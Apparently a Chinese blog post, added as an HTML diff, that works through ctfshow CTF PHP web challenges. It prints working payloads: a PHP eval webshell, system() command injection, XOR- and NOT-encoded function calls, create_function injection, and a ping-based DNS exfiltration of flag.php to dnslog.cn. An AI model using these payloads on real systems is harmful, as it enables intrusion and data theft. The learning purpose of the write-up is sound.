@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"na0hblog.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="-–title: ctfshow web php特性date: 2021-10-30 10:47:28author: 土哥 tags:- 学习笔记categories:我不选，我都要- 学习笔记excerpt: 坚持description: 努力 -–">
+<meta property="og:type" content="article">
+<meta property="og:title" content="佩斯利小姐House">
+<meta property="og:url" content="http://na0hblog.top/2022/01/17/ctfshow%20web%20php%E7%89%B9%E6%80%A7/index.html">
+<meta property="og:site_name" content="佩斯利小姐House">
+<meta property="og:description" content="-–title: ctfshow web php特性date: 2021-10-30 10:47:28author: 土哥 tags:- 学习笔记categories:我不选，我都要- 学习笔记excerpt: 坚持description: 努力 -–">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="og:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png">
+<meta property="article:published_time" content="2022-01-17T03:49:26.838Z">
+<meta property="article:modified_time" content="2022-01-17T03:56:21.089Z">
+<meta property="article:author" content="lbj">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png">
+
+<link rel="canonical" href="http://na0hblog.top/2022/01/17/ctfshow%20web%20php%E7%89%B9%E6%80%A7/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | 佩斯利小姐House</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">佩斯利小姐House</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://na0hblog.top/2022/01/17/ctfshow%20web%20php%E7%89%B9%E6%80%A7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lbj">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="佩斯利小姐House">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-17 11:49:26 / 修改时间：11:56:21" itemprop="dateCreated datePublished" datetime="2022-01-17T11:49:26+08:00">2022-01-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>-–<br>title: ctfshow web php特性<br>date: 2021-10-30 10:47:28<br>author: 土哥</p>
+<p>tags:<br>- 学习笔记<br>categories:我不选，我都要<br>- 学习笔记<br>excerpt: 坚持<br>description: 努力</p>
+<p>-–</p>
+<span id="more"></span>
+
+
+
+<p>Php特性</p>
+<p>web89 通过数组绕过即可 构造?num[]=1 因为intval 非空的数组 会返回1 可绕</p>
+<p>web90 因为我们提交的参数值默认就是字符串类型 所以我们可以直接输入 ?num=%204476 或者?num=4476a</p>
+<p>web91 要了解换行符 %0a  观察表达式 要通过第一个 不能通过第二个 观察正则表达式<br> %0a符合前面是空匹配换行符后面所以可通过 第二个表达式 不符合 以php开头 以phpj结尾 所以构造 ?cmd=%0aphp</p>
+<p>web92 学会进制转换绕过 0x前缀16进制 0前缀8进制 否则10进制 用16进制因为可以用字母0x117c<br> web93 屏蔽了字母 用8进制 010574</p>
+<p>web94 strpos() 函数返回字符串在另一个字符串中第一次出现的位置<br> 所以必须要找到0 而且不在首位 没有字母 于是构造?num=4476.0 其实.换成大部分符号都可以</p>
+<p>web95 用八进制绕过但是 前面必须加上 加号或者空格 构造 ?num=+010574</p>
+<p>web96可以用多种方式 绝对路径打开 / ?u=/ var/ www/ html /flag.php 相对路径 ?u= ./ flag.php 利用php伪协议 ?u=php：// filter / resource=flag.php</p>
+<p>web 97 写过很多次 强类型直接数组绕过</p>
+<p>web98<br> $_GET?$_GET=&amp;$_POST:&apos;flag&apos;;  表示如果用GET传参 ，则用POST传参 flag覆盖<br> 中间两行没用 highlight_file($_GET[&apos;HTTP_FLAG&apos;]==&apos;flag&apos;?$flag:<strong>FILE</strong>); 表示 传参 的HTTP_FLAG为flag字符串 则读取flag文件 最后 highlight显示 所以其实get随便传参 但是post传参必须 HTTP_FLAG=flag</p>
+<p>web99array_push() 函数向第一个参数的数组尾部添加一个或多个元素（入栈），然后返回新数组的长度 n_array () 函数搜索数组中是否存在指定的值 get后缀加上?n=1.php content=<?php @eval($_POST[1]);?>  上传之后 再后缀访问1.php post 先查看 文件 1=system（&apos;ls&apos;）; 发现flag36d.php 再1=system(&apos;tac flag36d.php);</p>
+<p>web100<br> is_numeric() 函数用于检测变量是否为数字或数字字符串 eval() 函数用来执行一个字符串表达式，并返回表达式的值 var_dump() 函数 PHP 可用的函数 var_dump() 函数用于输出变量的相关信息。 $v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3); v0取决于v1是不是数字;提示了 flag在 ctfshow 所以 v2要 var_dum($ctfshow) v3= 即可 或者/**/内联注释掉 所以构造 ?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=; 得到 加上ctfshow{ } 0x2d改成-</p>
+<p>web101<br> is_numeric() 函数用于检测变量是否为数字或数字字符串。<br> v1随便等于一个数字v2等于反射类echo new ReflectClass v3存在即可 所以url ?v1=1&amp;v2=echo new ReflectClass&amp;v3=;<br> 将0x26 改为- 爆破最后一位数字</p>
+<p>web102 call_user_func — 把第一个参数作为回调函数调用 die() 函数输出一条消息，并退出当前脚本 审计代码 v2是数字 影响v4<br> 要v2<br> 提交第三位的数字 要知道一个能命令执行又能够数字 base64再转为字符串再转为数字16进制的e的科学计数法 hex2bin将十六进制字符串转为二进制字符串 所以一定要知道5044383959474e6864434171594473这个神奇的字符串转为base64字符串再base64后为&lt;?=<code>cat *</code>; 所以v2要传这个数字串 v3就用了打开文件 v1转化数字串为字符串 url：post:v1=hex2bin get:?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php 要注意这题因为substr 从第三个字符开始 所以数字串前面要补两个0 对了还要查看源代码呜呜</p>
+<p>web103 字符串屏蔽了php 但是我们没用到php 所以题解和web102一样</p>
+<p>web104isset() 函数用于检测变量是否已设置并且非 NULL。这个题我熟悉 shal比较 数组绕过即可</p>
+<p>web105变量覆盖 $$ 想error等于flag post:error=suces get :?suces=flag error=a  a=flag都行</p>
+<p>web106 数组绕过 五秒</p>
+<p>web107 parse_str() 函数把查询字符串解析到变量中。 if($v2[&apos;flag&apos;]==md5($v3))要想办法绕过这个 v3=240610708（md5解密之后0e开头） v1=flag=0 结果均为0</p>
+<p>web108 strrev() 函数反转字符串。ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false intval() 函数用于获取变量的整数值 这里忽略了ereg存在截断漏过 要绕过可以加字符串然后 %00即可 这题url ?c=xxx%00778</p>
+<p>web109 php异常处理类 所以可以构造v1=ReflectionClass&amp;v2=system(&apos;ls&apos;);看到 目录 然后 system(&apos;tac&apos;) ReflectionClass可换成exception</p>
+<p>web 110 屏蔽了基本上所有符号 FilesystemIterator文件系统迭代器在PHP5.3新加入，继承自DirectoryIterator，可以通过传入路径得到索引该目录下所有文件的迭代器 ；getcwd()方法用于返回当前路径 要了解这个方法  url=?v1=FilesystemIterator&amp;v2=getcwd  然后直接访问文件即可</p>
+<p>web111 我们要知道全局变量 $GLOBALS — 引用全局作用域中可用的全部变量；一个包含了全部变量的全局组合数组。变量的名字就是数组的键。这题flag是外部变量要传进来 只能用全局变量 <a href="URL:?v1=ctfshow&v2=GLOBALS">URL:?v1=ctfshow&amp;v2=GLOBALS</a></p>
+<p>hp<br> web113一个个找php支持的协议找的compress.zlib://file.gz /pro<br> <img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image001.png" alt="img">先出那么多目录 以为错误 但是又可以进入php 浩好骚不太会<br> web114 不屏蔽filter 那就 ?file=php://filter/resource=flag.php</p>
+<p>web115<br> trim() 函数移除字符串两侧的空白字符或其他预定义字符。 功能除去字符串开头和末尾的空格或其他字符。 filter() 函数用于过滤序列，过滤掉不符合条件的元素，返回由符合条件元素组成的新列表。 trim函数会过滤空格以及\n\r\t\v\0 但不会过滤\f 换页符号 这是也就是%0c 控制码<br> “\0” “%00” (ASCII 0 (0x00))，空字节符。<br> 制表符<br> “\t” (ASCII 9 (0x09))，水平制表符。<br> 空白字符：<br> “\n” (ASCII 10 (0x0A))，换行符。<br> “\v” “\x0b” (ASCII 11 (0x0B))，垂直制表符。<br> “\f” “%0c” 换页符<br> “\r” “%0d”(ASCII 13 (0x0D))，回车符。<br> 空格:<br> “ “ “%20” (ASCII 32 (0x20))，普通空格符。</p>
+<p><em>web123<br> 哇这个php特性学到了 PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格 + . [转换为_ ，有一个特性可以绕过能使变量名出现“.”那就是特殊符号[ ，[会被替换成_,但其后的字符就不会被替换如 CTF[<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">SHOW.COM=&gt;CTF_<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">SHOW.COM 还有要注意的是 审计代码eval(“$c”.”;”); 直接可以c也就是这题的fun=echo $flag 还不能有fl0g 我么可以先尝试一下CTF_SHOW=1&amp;CTF[<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">SHOW.COM=2&amp;fun=echo 1 发现可以直接传值进去 （Eval函数的一般语法：eval(string $code)）<br> 所以构造CTF_SHOW=1&amp;CTF[<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">SHOW.COM=2&amp;fun=echo $flag 小小说一下var_dump() 函数用于输出变量的相关信息 和print_r这些都被禁用了 但是getcwd//取得当前目录 implode将一维数组转成字符串 implode(get_defined_vars())可以输出一部分看到f</em>**.***了 然后再找 发现echo implode(get_defined_vars())</p>
+<p><em>web125<br> 因为ban了好多输出函数 echo不能用了 相信办法罗 还是要看看别人的wp和hint不然这些压根就写不出来嘛<br> extract() 函数从数组中将变量导入到当前的符号表。所以可以fun=extract($_POST) 审计代码 因为不能直接echo $f</em>** 所以 if($fl0g===”flag_give_me”)就要fl0g=flag_give_me 所以构造为 CTF_SHOW=1&amp;CTF[<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">SHOW.COM=2&amp;fun=extract($_POST)&amp;fl0g=flag_give_me 官方hint是GET:?1=flag.php POST:CTF_SHOW=&amp;CTF[<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">SHOW.COM=&amp;fun=highlight_file($_GET[1])</p>
+<p>*web126<br> 又过滤了很多东西<br> 如果没有 过滤f的话可以用数组 ?fl0g[]=flag_give_me 下面 extract($_GET[fl0g][0])<br> 覆盖的 extract不能用，parse_str代替 fun=parse_str($_GET[a])但是长度超过16了 不能用 要用到a变量缩减$a=$_SERVER[&apos;argv&apos;] 想办法把a调用出来 shell_exec($_get)//— 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回超字符tristam被禁用<br> 只能用a a[0]第一个字符 a[fl0g]=flag_give_me变成1+fl0g=flag_give_me<br> 构造get:?a=1+fl0g=flag_give_me post:CTF_SHOW=1&amp;CTF[<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">SHOW.COM=2&amp;fun=parse_str($a[1]) argv是脚本执行参数 调用是数组以空格输出 a[1]代表fl0g=flag_give_me 算强了</p>
+<p>*web127 变量覆盖 直接 ctf_show=ilove36d php特性点和空格会被转为下划线 直接 ?ctf show=ilove36d即可<br> *web128新知识来了 gettext拓展的使用<br> 开启拓展后 <em>() 等效于 gettext() 题目代码中有call_user_func 相当于 /<em>call_user_func — 把第一个参数作为回调函数调用</em>/ 只可以看到第一个无参调用的函数?f1=</em>&amp;f2=phpinfo试一下可以看到phpinfo嘛 call_user_func(&apos;<em>&apos;,&apos;phpinfo&apos;) 返回的就是phpinfo 用到get_defined_vars函数返回由所有已定义变量所组成的数组 所以构造为?f1=</em>&amp;f2=get_defined_vars</p>
+<p>*web129<br> stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。<br> 先说说别的解把 用 filter伪协议其实可以绕过 加上个|ctfshow就好，?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php<br> 或者就是用目录穿越漏洞绕过stripos 但是很卡<br> 可以?f= ../ctfshow/../../www/html/flag.php ?f=/ctfshow/../../../../../../../../../var/www/html/flag.php</p>
+<p>*web130<br> 绕过这个正则第一个是大小写第二个是换行 在/s模式下，.匹配任意字符，+表示重复一次或更多次，没错是至少一次！而后面加个?表示懒惰模式，+?表示重复1次或更多次，但尽可能少重复。当然懒惰模式并不影响解题思路，stripos() 函数是int值和布尔值肯定不是===，总之就是ctfshow前面必须得有字符才能匹配到，<br> 所以直接f=ctfshow 其实有个非预期 数组绕过f[]=1</p>
+<p>*web131<br> 深悉正则(pcre)最大回溯/递归限制<br> 大概意思就是在php中正则表达式进行匹配有一定的限制，超过限制直接返回false<br> 有36d<br> 就没法绕过？+ 要超过这个长度就不匹配 超过十万次&lt;?php<br> echo str_repeat(&apos;very&apos;,250000).&apos;36Dctfshow&apos;; 这样服务器就会爆了 就能绕过<br> 根本复制粘贴不了 还是用脚本吧<br> import requests</p>
+<p> url = “<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img"><a target="_blank" rel="noopener" href="http://b17efffa-c0a0-42a4-9b49-45fb23ed490f.challenge.ctf.show/&quot;">http://b17efffa-c0a0-42a4-9b49-45fb23ed490f.challenge.ctf.show/&quot;</a></p>
+<p> print(requests.post(url, data={“f”: “very”*250000+”36Dctfshow”}).text)</p>
+<p>*web132<br> 假的前端 先访问robots 再打开/admin mt_rand() 函数使用 Mersenne Twister 算法生成随机整数<br> 代码审计 php运算符优先级 ||低于&amp;&amp;只需要username=admin 为真就不用看前面得了 还要code=admin即可 所以构造?username=admin&amp;code=admin</p>
+<p>*web133<br> substr(string,start,length)<br> 有一个变量可以用$F， ?F=<code>$F</code>; 有个空格够六个字符可以直接跟shell命令 引入shell进行执行 在反引号里面 可以试一下 ?F=<code>$F</code>; touch 1执行后访问一下1 没有说明目录不可写 把数据带回来可以用一个没学过的骚操作 可用<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">dnslog.cn 拿到一个域名 用ping 命令访问flag.可用<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">dnslog.cn 拿到一个域名  ?F=<code>$F</code>; ping <code>cat flag.php</code>.<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">bx51su.dnslog.cn -c 1 没有值 让他格式化 ： ?F=<code>$F</code>; ping <code>cat flag.php | grep ctfshow | tr -cd&quot;[a-z]&quot;/&quot;[0-9]&quot;</code>.<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img">bx51su.dnslog.cn -c 1 然后再在<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img"><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn/</a> 刷新一下数据 然后得到flag但是要自己设置- 8 4 4 12</p>
+<p>*web134<br> extract – 从数组中将变量导入到当前的符号表<br> PHP parse_str() 函数 把查询字符串解析到变量<br> querystring 查询字符串 get读取 导入符号表 把post内容填充再释放<br> ?_POST[key1]=36d&amp;_POST[key2]=36d 因为是flag.php文件所以要查看源代码</p>
+<p>*web136 exec是无回显的命令执行<br> 方法1tee为Linux指令，tee把日志输出到log的同时输出到屏幕。<br> ?c=ls /|tee 1 看根目录 把文件放进1里 再查看 /1<br>  看到文件内容发现有flag文件 ?c=cat /fl49_15_h3r3|tee 2 再查看/2<br> 再来个骚方法2 ?c=ls |xargs sed -i &apos;s/exec/system///die也要改为echo再访问原网页 exec改为system die变为echo 改为echo 正则虽然被过滤 但还是会执行<br> xargs -i能将每项赋值给。。。能它能够捕获一个命令的输出，然后传递给另外一个命令，能是给命令传递参数的一个过滤器，也是组合多个命令的一个工具。具体见<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img"><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-xargs.html">https://www.runoob.com/linux/linux-comm-xargs.html</a> 然后直接就?c=ls / c=cat /f149_15_h3r3</p>
+<p>*web137<br> call_user_func — 把第一个参数作为回调函数调用<br> getflag是静态方法 不用实例化(::可以不用实例化)直接调动<br> ::可以调用一个静态的、不依赖于其他初始化的类方法.<br> 所以这题调用静态方法 ctfshow=ctfshow::getFlag<br> 如果这题不是静态类 那就要 ctfshow=call_user_func_array(array(new ctfshow(),&apos;getFlag&apos;),args)  //String args[ ]或者String[ ] args表示给主方法传一个字符串数组. 而args是一个字符串数组的变量名，不是关键字，是</p>
+<p>*web138<br> PHP strripos() 函数 查找 “php” 在字符串中最后一次出现的位置：<br> 所以这题就是多屏蔽了个冒号 call_user_func 使用call_user_func函数，通过传入字符串函数，可以调用自定义函数，并且支持引用。中不但可以传字符串也可以传数组。 对于call_user_func具体见<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img"><a target="_blank" rel="noopener" href="https://www.php.cn/php-weizijiaocheng-288646.html">https://www.php.cn/php-weizijiaocheng-288646.html</a> 构造ctfshow[]=ctfshow&amp;ctfshow[]=getFlag</p>
+<p>*web140<br> intval() 函数用于获取变量的整数值。 弱比较 所以 0和字符串相等<br> 所以if(intval($code) == &apos;ctfshow&apos;){ 让前者等于0即可<br>  md5(phpinfo())<br> md5(sleep())<br> md5(md5())<br> current(localeconv)<br> sha1(getcwd())   因为/var/www/html md5后开头的数字所以我们改用sha1<br> f1=md5&amp;f2=sleep<br> f1=md5&amp;f2=phpinfo<br> 很多<br> 所以但是要先看清楚是弱比较</p>
+<p><em>web141<br> 正则表达式中^的用法 用法二：（否）取反<br> 正则表达式[\w]+,\w+,[\w+] 三者有何区别：<br> [\w]+和\w+没有区别，都是匹配数字和字母下划线的多个字符；<br> [\w+]表示匹配数字、字母、下划线和加号本身字符； $匹配结尾位置<br> 总之就是<br> /^\W+$/ 作用是匹配非数字字母下划线的字符 前两个是数字 后一个非数字字母<br> 1+phpinfo+1能执行 1+&apos;phpinfo&apos;+1也能执行 phpinfo一个个找ascii编码异或<br> 然后再找 1-(&apos;system&apos;)(&apos;ls&apos;)-2<br> 比如s是这样找<br> 自己构造一个二进制 固定下来方便那就是1111 1010 也就是%fa<br>                                10001001 中间就是需要的值 上面和下面异或出来的结果 %89<br>                    ascii码的二进制01110011%73 (为什么要求中间的值呢因为等下会用第一行异或第二行得到第三行也就是这个字母的ascii 二进制<br> 1-(&apos;system&apos;)(&apos;ls&apos;)-2   //而且统一要用url编码<br> -(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa^%96%89)-<br> 读出来就用1-(&apos;system&apos;)(&apos;tac f</em>&apos;)    空格是 1111 1010 %fa 1101 1010 %da 0010 0000 %20<br> -(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)- 构造：?v1=1&amp;v2=2&amp;v3=-(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)-</p>
+<p>*web142<br> $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);<br> 好蠢啊 0和任何数相乘为0呀</p>
+<p><em>web143<br> ?v1=1&amp;v2=2&amp;v3=</em>(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)* 与11一样减号被ban了 那就用*</p>
+<p>*web144<br> 换个位置<br> ?v1=2&amp;v3=-&amp;v2=(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0) v3必须是一位的符号</p>
+<p><em>web145 把^也屏蔽掉了 这题要学会运用三目运算符 大概就是? : ; “?”运算符的含义是：先求表达式1的值，如果为真，则执行表达式2，并返回表达式2的结果；如果表达式1的值为假，则执行表达式3，并返回表达式3的结果。 用其他的运算法构建字符串 这里用取反、<br> s的ascii 是 0111 0011 %73 那就是 1000 1100 %8c<br>  system ls  system(tac f</em>);<br> (<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%d5%9e%d5) 要加上<br> ?v1=1&amp;v2=2&amp;v3=?(<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%d5%9e%d5):</p>
+<p>*web146<br> :也被ban了 那就看看hint<br> 可以用| 那就?v1=1&amp;v2=2&amp;v3=|(<del>%8c%86%8c%8b%9a%92)(</del>%8b%9e%9c%df%d5%9e%d5)|</p>
+<p>*web147<br> 正则：</p>
+<p> if(!preg_match(&apos;/^[a-z0-9_]<em>$/isD&apos;,$ctfshow)) {  //其实就是不能数字字母开头<br> i ：(PCRE_CASELESS)<br> 　如果设定此修正符，模式中的字符将同时匹配大小写字母。<br> s：（PCRE_DOTALL）<br> 　如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符（一般情况下‘.’是不能匹配‘\n’的）<br> D：（PCRE_DOLLAR_ENDONLY）<br> 　如果设定了此修正符，模式中的美元元字符仅匹配目标字符串的结尾。<br> 具体见 <img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img"><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33095951/article/details/52513674">https://blog.csdn.net/qq_33095951/article/details/52513674</a><br> 是P神代码审计小密圈2周年的一道题目，考点也比较明显，是create_function的代码注入，参考如下：解析create_function() &amp;&amp; 复现<br> 原理就是}闭合原来的函数，然后执行命令，然后再把多余的}给注释掉就可以了。但是这题相对难办的是这个正 则<br> 使用命名空间绕过 见<img src="file:///C:/Users/浩土土/AppData/Local/Temp/msohtmlclip1/01/clip_image002.png" alt="img"><a target="_blank" rel="noopener" href="https://paper.seebug.org/94/">https://paper.seebug.org/94/</a><br> \是全局命名空间 php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法<br> 用命名函数 肯定先用}闭合 这就解释通了吧，我们用;}闭合了函数，phpinfo();后的/<em>会注释掉之后的代码，<br> 先看目录 post:ctf=\create_function get:?show=}system(&apos;ls &apos;);/</em><br> 看flag post:ctf=\create_function get:?show=}system(&apos;tac flag.php &apos;);/</em></p>
+<p><em>web148<br> 用异或<br> 读出来就用(&apos;system&apos;)(&apos;tac f</em>&apos;)    空格是 1111 1010 %fa 1101 1010 %da 0010 0000 %20<br> (%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0) 显示说没分号结尾</p>
